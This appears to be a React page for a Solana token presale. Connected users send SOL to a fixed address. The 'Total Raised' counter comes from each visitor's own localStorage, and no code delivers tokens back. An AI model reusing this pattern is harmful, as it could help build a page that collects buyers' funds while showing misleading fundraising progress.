'use client';

import React, { useState, useEffect } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';

require('@solana/wallet-adapter-react-ui/styles.css');

const recipientAddress = 'FM7huQouPgKmAVkEatSWA9x7aW8ArmbjSNosR62ctdyr';
const SOL_PRICE = 0.005;
const MAX_SOL = 50;
const MIN_SOL = 0.1;

export default function Home() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();

  const [solAmount, setSolAmount] = useState('');
  const [error, setError] = useState('');
  const [txComplete, setTxComplete] = useState(false);
  const [raised, setRaised] = useState(0);

  useEffect(() => {
    const stored = localStorage.getItem('totalRaised');
    if (stored) setRaised(parseFloat(stored));
  }, []);

  const handleBuy = async () => {
    const amount = parseFloat(solAmount);
    if (!publicKey || isNaN(amount) || amount < MIN_SOL || amount > MAX_SOL) {
      setError(`min ${MIN_SOL} SOL`);
      return;
    }

    try {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(recipientAddress),
          lamports: amount * 1e9,
        })
      );

      const signature = await sendTransaction(tx, connection);
      await connection.confirmTransaction(signature, 'confirmed');

      const newRaised = raised + amount;
      setRaised(newRaised);
      localStorage.setItem('totalRaised', newRaised.toString());

      setTxComplete(true);
      setSolAmount('');
      setError('');
    } catch (err) {
      console.error(err);
    }
  };

  const gradient =
    'linear-gradient(135deg, #a34fd6, #f770aa, #ffcba4)';

  return (
    <div
      style={{
        minHeight: '100vh',
        background: gradient,
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        padding: 20,
        textAlign: 'center',
      }}
    >
      <h1 style={{ fontSize: '3rem', fontWeight: 'bold', color: 'white' }}>
        Butterfly $FLY Presale Portal
      </h1>

      <div style={{ marginTop: 20 }}>
        <WalletMultiButton
          style={{
            background: gradient,
            color: 'white',
            fontWeight: 'bold',
            borderRadius: 8,
          }}
        />
      </div>

      {publicKey && (
        <>
          <input
            type="number"
            min={MIN_SOL}
            max={MAX_SOL}
            step="0.01"
            value={solAmount}
            onChange={(e) => setSolAmount(e.target.value)}
            placeholder="Enter amount in SOL"
            style={{
              marginTop: 20,
              padding: 10,
              borderRadius: 8,
              border: '1px solid #ccc',
              width: '200px',
              textAlign: 'center',
            }}
          />
          {error && (
            <div style={{ color: 'red', marginTop: 8 }}>{error}</div>
          )}

          <button
            onClick={handleBuy}
            style={{
              marginTop: 20,
              padding: '10px 20px',
              background: gradient,
              color: 'white',
              fontWeight: 'bold',
              border: 'none',
              borderRadius: 8,
              cursor: 'pointer',
            }}
          >
            Buy FLY
          </button>

          <div style={{ marginTop: 30, color: 'white' }}>
            <div>Total Raised: {raised.toFixed(2)} SOL / 10,000 SOL</div>
            <div
              style={{
                marginTop: 10,
                width: '300px',
                height: '10px',
                background: '#00000066',
                borderRadius: 5,
                overflow: 'hidden',
              }}
            >
              <div
                style={{
                  width: `${(raised / 10000) * 100}%`,
                  height: '100%',
                  background:
                    'linear-gradient(to right, #00ff88, #66ffcc)',
                  transition: 'width 0.5s ease-in-out',
                }}
              />
            </div>
          </div>
        </>
      )}

      {txComplete && (
        <div
          onClick={() => setTxComplete(false)}
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            height: '100vh',
            width: '100vw',
            backgroundColor: 'rgba(0,0,0,0.6)',
            color: 'white',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '2rem',
            fontWeight: 'bold',
            zIndex: 1000,
            cursor: 'pointer',
          }}
        >
          Transaction Completed
        </div>
      )}
    </div>
  );
}
